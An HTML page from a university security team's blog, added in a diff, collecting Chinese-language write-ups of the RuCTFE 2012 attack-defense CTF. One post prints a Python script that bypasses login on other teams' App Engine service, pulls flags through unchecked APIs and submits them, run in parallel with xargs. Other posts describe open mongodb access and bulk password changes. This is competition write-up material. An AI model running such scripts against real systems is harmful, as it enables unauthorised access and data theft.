@@ -1,0 +1,533 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="flightprocess是一个基于Google App Engine的应用 拿到程序以后现在本地搭建了一个GAE的SDK环境，然后在本地运行了起来 大致看了看这个程序，是一个在线编辑交通图的IDE。所有文件（交通图用XML表示，还有其他图片什么的）都丢在数据库里。 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/8">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/ructfe2012_flightprocess/">[RuCTFE2012]flightprocess</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-28T00:00:00+08:00" pubdate data-updated="true">Nov 28<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>flightprocess是一个基于Google App Engine的应用</p>
+
+<p>拿到程序以后现在本地搭建了一个GAE的SDK环境，然后在本地运行了起来</p>
+
+<p>大致看了看这个程序，是一个在线编辑交通图的IDE。所有文件（交通图用XML表示，还有其他图片什么的）都丢在数据库里。</p>
+
+<p>杨坤在data文件里找到了明文的KEY。而且，KEY好像是保存在XML中，把这段明文复制出来，放在前端的IDE里面，正好是一张交通图。</p>
+
+<p>然后我就猜想，KEY在某个交通图里，这个交通图在某个工程里面，然后这个工程又是公开的，所有人都能读取。</p>
+
+<p>后来在GAE的调试模式下面的确验证了我的猜想。注意XML文件也当做是二进制文件保存了，GAE的后台无法直接看到这个KEY。</p>
+
+<p>并且从梁校长那里看到的流量中，看到了比赛组织者推送KEY的过程</p>
+
+<p>之后杨坤和俞则明联手从javascript里找到了拿到KEY的api</p>
+
+<p>然后杨坤就开始从前台开始分析这个IDE，发现全都是JavaScript动态生成的。</p>
+
+<p>找到几个API：<br/>
+列某个工程下的所有文件，<br/>
+/api/files/list/[工程名称]/</p>
+
+<p>读取某个工程下的某个文件，<br/>
+/api/files/browse/[工程名称]/[文件名称]</p>
+
+<p>列所有工程，<br/>
+/api/projects/list</p>
+
+<p>查找工程<br/>
+/api/projects/find</p>
+
+<p>除了列所有工程做了用户权限检查，其他的API都没有做用户权限检查，也就是说，任何用户都能看到所有工程的所有文件。<br/>
+并且查找工程是返回所有工程名字然后在前端查找的。</p>
+
+<p>然后就是自动化的事情了.</p>
+
+<p>我使用Python的cookielib登录，先拿到所有的project list，然后通过json解析把其它的信息取得，最后使用正则把KEY匹配出来，并且自动进行telnet提交到裁判</p>
+
+<p>宋教授建议我把python脚本做成单参数的，然后他使用xargs进行并行处理，while 1;把所有队的跑一遍</p>
+
+<p>这次主要的时间浪费在搞清比赛规则上，例如完全不知道KEY是啥时候推过来。其实漏洞倒不是特别难，但是如果没有GAE的经验的话，会无从下手。我一开始打算一点点看代码，但是太累了，幸好俞使用了前端调试，很快就找到了。</p>
+
+<p>代码如下</p>
+
+<pre><code>import urllib2
+import urllib
+import cookielib
+import json
+import sys
+import re
+
+ips = [sys.argv[-1]]
+
+for i in ips:
+    cookieJar = cookielib.CookieJar()
+    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookieJar))
+    #print i
+    f = opener.open("http://"+i+":10800/_ah/login?email=test%40example.com&amp;amp;admin=True&amp;amp;action=Login&amp;amp;continue=")
+    #print f.read()
+
+    f = opener.open("http://%s:10800/api/projects/find"%i)
+    a = f.read()
+    #print a
+
+
+    b = json.loads(a)
+    c =  b['data'][-1]['link_name']
+
+    f = opener.open("http://"+i+":10800/api/files/list/"+c+"/")
+    d = f.read()
+
+    e = json.loads(d)
+    g =  e['data'][0]['name']
+
+    f = opener.open("http://"+i+":10800/api/files/browse/%s/%s.fpml"%(c,g))
+    pattern = r"\w{31}="
+    nn = re.findall(pattern,f.read())[-1]
+    print nn
+    import telnetlib
+    tn = telnetlib.Telnet('flags.e.ructf.org',10001)
+    tn.read_until("Enter your flags,")
+    tn.write(nn+'\n')
+    tn.close()
+</code></pre>
+
+<p>执行的Bash命令是</p>
+
+<pre><code>while :;do  xargs -P50 -i python do.py.bak '{}'  output;done
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/ructfe-2012-mongodb/">RuCTFE 2012之mongodb</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-27T00:00:00+08:00" pubdate data-updated="true">Nov 27<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>这是我第一次参加 RuCTFE 这种攻防形式的黑客比赛，完全没有任何经验。虽然横遭惨虐，但是还是在团队的努力下进入了前30，也算是前进途中的一个脚印吧。</p>
+
+<p>比赛开始后，我看的第一个服务是 node.js/mongodb 的服务，这是一道 web 的题目，是一个聊天系统，支持 session，注册登陆等基本功能。很快我们注意到，mongodb 的端口 27017 listen 在 0.0.0.0 上，而且没有密码，从任何地方都可以直接登陆。这显然是一个漏洞，比较低级一点的漏洞。于是我们进行了修补，让他 listen 在 127.0.0.1 上，node.js 和 mongodb 的通信不受干扰。随后我又看了看 node.js 部分，代码很简单，但是没有收获任何漏洞。</p>
+
+<p>进入 attack 阶段后，我迅速找了几个其他队伍的 mongodb 连接进去，但是却发现什么也没有。数据库是空的。我的第一想法是可能这不是个漏洞，是主办方故意留出来的，方便他们推送信息，但是过了一会，我又尝试了一遍，却惊喜地发现，在 mch 数据库中 sessions 和 chats 两个 collections 里面有明显是 key 的信息。于是迅速尝试提交一个，accepted! 惊喜之余立刻去刷新 scoreboard，却发现分数没有变化。Kelwya 说可能是他们有延迟，既然 accepted，那应该就是得分了。果然过了一会，分数刷新后，我们确实拿到了 2 分。在 Group1 里面，我们是第二个拿到 attack 分数的团队。随后我继续使用这个漏洞寻找可以得分的队伍，round1 拿到了几十分，round2 居然前 30 的队伍仍然有没有修补这个漏洞的，拿到了十几分。</p>
+
+<p>回顾一下，找到这个漏洞之后，没有及时写脚本来自动扫 key，这不仅太浪费时间，也让我无暇去找其他漏洞。显然这道题目有一些高级漏洞，可以直接把 mongodb 搞挂（我们到后面阶段这个服务就基本是 down 的）。没有写脚本自动扫 key 的原因是 key 可能出现在 chats 和 sessioins 两个 collections 里面，并且变化比较多，给写脚本带来了一些困难，再加上进入午夜，精力实在跟不上（实在是佩服那些精力充沛奋战到结束的童鞋），最终就没有写，吃了不少亏。</p>
+
+<p>另外不得不说比赛在网络上经常出问题，也非常影响我们，不仅影响我们本身的 defense 分数，也影响大家的工作效率，还影响大家拿到 key 之后的提交。我们在网络上还是吃了不少亏的，这也是实在没有办法的事情。</p>
+
+<p>很高兴能有机会加入到 blue-lotus 这个团队，从比赛的角度来看，blue-lotus 称为中国黑客第一团队是毫不为过的。几次比赛下来，一方面我能感受到团队进步很大，另一方面，也不得不承认与国外强队的差距。衷心祝愿 blue-lotus 能越走越远，在国际 hacker 和 security 领域占有一席之地，也希望能继续有机会献上绵薄之力。期待下次再战！</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/geotracker%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/">RuCTFE 2012之geotracker漏洞分析</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-27T00:00:00+08:00" pubdate data-updated="true">Nov 27<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>这个漏洞是由陈钦（hellok）和我一起分析发现的，在这里不得不说下逆向大牛hellok，他对java程序，二进制程序等各种逆向都非常熟悉，而且为人很低调谦虚，所以大家没有感觉到他的厉害。下面说下程序分析思路。</p>
+
+<p>首先，通过查看proc目录，得到程序的运行命令为java -jar geotracker.jar push-server,这个在合作文档中可以看到，说明程序以push-sevrer作为参数。</p>
+
+<p>然后，在程序目录下就看到push-server.xml，对java程序比较了解的同学，应该知道java的很多框架都是用xml来作为配置文件，而且这个xml文件非常重要，是保证程序松耦合和灵活性的重点。打开xml文件就会看到很多重要信息。这个程序采用spring+hibernate框架设计，使用了hsql数据库，hsql采用 In-process模式运行，数据库的用户名为sa，密码为空。你可能会想到，从外部连接到数据库去看看数据库内部数据，但是hsql的In-process模式不支持这种做法。所以，我们只有去找数据库的文件，在配置文件中，我们知道数据库的名字叫localDB，然后在程序目录下就会找到localDB.scripts文件。根据师兄们给我们讲的经验，key一般存在于数据库中。然而，第一次我们打开这个文件时，文件中基本没有数据，但是我们清晰的看到了表结构。</p>
+
+<p>其实在我打算分析这个程序之前，hellok很早就在合作文档中写下的发现一个SQL注入漏洞，在程序的NotificationRepository.java文件中存在以下一段代码</p>
+
+<p><img src="http://img.my.csdn.net/uploads/201211/26/1353930188_4059.png" alt="enter image description here" /></p>
+
+<p>从这段代码中，我们看到程序在设置SQL语句参数时，使用string相加的形式，显然是不可取的。然后我们就在后面很长一段时间内不断分析怎么利用SQL注入。由于当时分析思路错误，浪费了很多时间。我们总是通过nc连接到10901端口，然后输入data1|PUSH|data2|data3向数据库插入数据，其中data1,data2,data3中包含特殊字符，但是无论我们怎么构造字符串，这些字符串都能完整的存入数据库，最后我们发现插入数据库的函数是javax中的一个库函数persist()，在网上搜了一下，没有发现对这个函数的SQL注入信息。这时，我们意识到前面那个sql注入漏洞只是在查询时存在。当然我们也走了一些其他的弯路，甚至一度怀疑程序运行依赖的jdk库有问题，反正很长一段时间都没有进展，一直不成功。</p>
+
+<p>在山重水复疑无路的时候，我们发现有一些流量向我们的镜像这个服务发送，开始我们以为是别人的攻击流量，通过分析发现，基本都是官方服务器发送的。然后赶紧打开数据库文件，里面竟然全部都是key,我们自己的key！这就坚定了我们去拖别人库的决心。最后我们发现，通过nc连接别人的10900端口，然后发送 :0: 字符串就可以完全将数据库内容查询出来，其中包含了很多key。然而当我们欣喜地提交这些key的时候，不知道什么原因，总是提示Denied: flag is too old、Denied: your appropriate service (geotracker) is not UP或者Denied: no such flag，我们觉得完全不可思议，因为我们自己数据库的这些内容都是官方服务器发送填充的。再加上我们自己的geotracker服务一直被检测处于down或者mumble状态，很长时间不能提交key，所以我们就没有继续分析这个服务。</p>
+
+<p>早上6点左右，我小憩一会儿醒来发现那个服务又被检测为up状态，我赶紧提交了几个key,结果accept一个，当我准备把这个抓key的步骤脚本化的时候，那个服务又down了，再加上当时我们队的名次不是很好，大家士气比较低落，然后我也就没有弄了，跟大家一起去吃饭，回去睡觉了。</p>
+
+<p>由于比赛在夜间进行，比赛过程很艰辛，但是充满快乐。我从这个比赛中，见识了各种牛人，增强了与其他同学的交流，学习到了很多漏洞分析知识。更重要的是，跟实验室的师兄和同学一起聚餐，一起努力通宵奋斗的经历，成为我这一年难忘的记忆之一。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/notes-of-ructfe-2012/">RuCTFE 2012參賽記</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-26T00:00:00+08:00" pubdate data-updated="true">Nov 26<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>海底撈火鍋</h2>
+
+<p>RuCTFE<br/>
+是什麼我現在還是說不上來，但長達8個小時緊張激烈的對抗和賽前的犒賞隊員的火鍋都將是這一年最有意義的事之一，<br/>
+因而這裏簡要記錄下來。<br/>
+有幸收到《Metasploit滲透測試指南》的譯者孙松柏的邀請，成为 blue-lotus<br/>
+队的一员，和網絡安全實驗室的同學一起出發，<br/>
+晚上一羣人去吃牡丹園的海底撈火鍋狀行。</p>
+
+<h2>RuCTFE</h2>
+
+<p>吃完火鍋回到比賽地點(實驗室)時已經近21:00了，大家都在忙着配置比賽時需要的網絡環境。<br/>
+此時我對比賽還是處於零準備狀態……臨時看了些 OpenVZ ConTainers control utility 的操作指南，<br/>
+在楊坤掛載的 RuCTFE2001 鏡像上測試了單行 shell 腳本列出所有監聽 tcp 端口的進程及其 /proc/$pid/{cwd,exe,cmdline}，<br/>
+分享在 Google Docs 協作文檔上。之後我的網絡就一直掛，連接不上我們隊的鏡像服務器，<br/>
+得依靠別人的 ssh 做一次跳板……吳育昕的跳板也一直掛……呃……挺奇怪的問題，不知道原因。</p>
+
+<h3>mch</h3>
+
+<p>我和吳育昕一起研究 mch 服務和它依賴的 mongodb，可恨以前沒認真研究過 mongodb 的配置以及客戶端 shell 使用，不知道如何給 admin 添加密碼，臨時想了個粗糙的辦法：在配置文件中用 bind_ip = 127.0.0.1<br/>
+來防止別的隊伍連接我們的 mongodb。朱文雷一人利用其他隊伍的這個漏洞獲取了大量 flags，得了很多分(現在還是沒搞清楚分數是怎麼計算的)。</p>
+
+<h3>flybook</h3>
+
+<p>從源文件 .d 可以看出來用的是 D語言，views/ 中的 .dt 是個類似 jade/slim 的簡潔模板引擎。<br/>
+代碼說真的看不大懂，僅知道和 gds 有密切聯繫。</p>
+
+<h3>gds</h3>
+
+<p>吳育昕通過 strings 研究出 /home/gds/service 有一些字符串信息，使用 HE 即可得到幫助，CP 則是修改密碼的指令。<br/>
+/home/booking/config 是 booking 連接 gds 使用的用戶名、密碼和監聽端口信息，可以看出用戶名和密碼都是 booking，<br/>
+那麼可以大膽猜測別的隊伍的密碼也是這樣。我寫了個腳本批量改了別人的密碼，不過只能阻止別人獲得 flags，而我們也遲遲沒能發現漏洞利用方法，<br/>
+這一招可謂損人不利己……這裏主要用到了兩個命令，xargs(-P 選項可以並發執行)和 coreutils 中的 timeout。</p>
+
+<h3>flightprocess</h3>
+
+<p>Python 寫的服務，王康和俞則明研究發現了服務的漏洞並找到了漏洞利用方法。<br/>
+我這時已經覺得很疲憊了，不想再多看其他題目源代碼了，和王康、吳育昕一起看怎麼寫<br/>
+Python 腳本自動化獲取提交 flags 的流程。依舊用到了 xargs -P 來併發執行，<br/>
+這時候 shell 是實現快速粗糙原型的絕佳方式。</p>
+
+<h3>apache2</h3>
+
+<p>80端口的 apache2 服務孫松柏後來發現可以用 <a href="http://$host/db/sessions">http://$host/db/sessions</a> 獲取 flags。我趕忙寫了個腳本自動化操作，不過發現時裏比賽開始已經過了很久了，<br/>
+獲得的 flags 很少。</p>
+
+<h3>其他</h3>
+
+<p>還有很多其他同學的工作，我不明真相就沒法在這裏列舉出來了。</p>
+
+<h2>後勤</h2>
+
+<p>感謝不知名同學提供的食物和飲料，是我們能堅挺下去的動力之一……希望以後食物能多點。<br/>
+我必須承認儘管吃火鍋時，我吃的肉應該是最多的，但是消化太快下半夜非常餓……<br/>
+還有負責衛生的同學，隊員們離開時必然是一片狼藉，新苦了！<br/>
+還要感謝幾位老師和很多忙碌與其他事的同學們的精神支持。</p>
+
+<h2>總結</h2>
+
+<p>比賽結束了，我們隊第29名，不知道是不是大家認可的排名，我之前因爲沒參加這類比賽，不好說着是不是一個讓人滿意的成績。<br/>
+但從種種不利因素看來，這個名次是值得驕傲的。這次比賽無論是天時還是地利，我們都沒有佔到優勢，大家從上半夜工作到下半夜，<br/>
+疲憊不堪，嚴重影響到看源代碼、分析流量、找漏洞、打補丁的效率；<br/>
+地利，我們的網絡不暢，從 scoreboard 上能獲知有不少時候因爲延時而導致服務被判成<br/>
+down 了； 而且隊伍人數和其他隊伍相比較應該也算是少的。</p>
+
+<p>從這次比賽看出我們很多可以改進的地方。<br/>
+以我自己爲例，</p>
+
+<ul>
+<li>沒有認真看完協作文檔</li>
+<li>沒有在之前的鏡像服務器上練習</li>
+<li>臨時抱佛腳學習 vzctl</li>
+<li>沒有參加之前組織的幾次培訓</li>
+<li>對比賽規則迷迷糊糊</li>
+</ul>
+
+
+<p>總之有很多做得不好的地方。</p>
+
+<p>另外：</p>
+
+<ul>
+<li>大家使用 qq 聯絡而不是 irc。官方實時信息也用了irc，所以人手一個客戶端還是很有必要的。<br/>
+Chrome 裏訪問 web.qq.com，desktop notification 着實煩人。<br/>
+irc daemon 可以採用 inspircd，默認配置就能用。</li>
+<li>不能有效地通知他人自己的工作進展。Google Docs 上有基於文本的簡單任務認領機制。<br/>
+但很容易出現：好不容易發現的問題和別人剛剛研究出來，不能有效利用人力。<br/>
+這裏我覺得可能給每個任務都建立單獨的討論區(比如irc的頻道)可能比較好。</li>
+<li>沒有良好的文件分享機制，FTP/NFS/WebDAV/Samba 等都沒有配置。</li>
+<li>沒有準備好批量在其他隊伍服務器上利用漏洞的腳本。腳本語言的多線程模塊，對於這個任務，<br/>
+xargs -P，GNU Parallel 都是不錯的工具。<br/>
+據說此次比賽的 flags 得分是線性的模式，有很多隊伍應該都開着類似的腳本。</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/ructf-2012/">RuCTFE 2012</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-10-29T00:00:00+08:00" pubdate data-updated="true">Oct 29<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>We are going to paticipate in <a title="RuCTFE2012" href="http://ructf.org/e/2012/" target="_blank">RuCTFE2012</a>.</p>
+
+<p>If you are interested in this attack-defense CTF game and would like to take part in with our team, please contact kelwin [AT] blue-lotus.net.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/7/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufoctf2013-web100-flagstore/">UFOCTF2013 Web100 FlagStore</a>
+      </li>
+    
+      <li class="post">
+        <a href="/sigint-2013-crypto300-satisfaction/">SIGINT 2013 Crypto300 Satisfaction</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
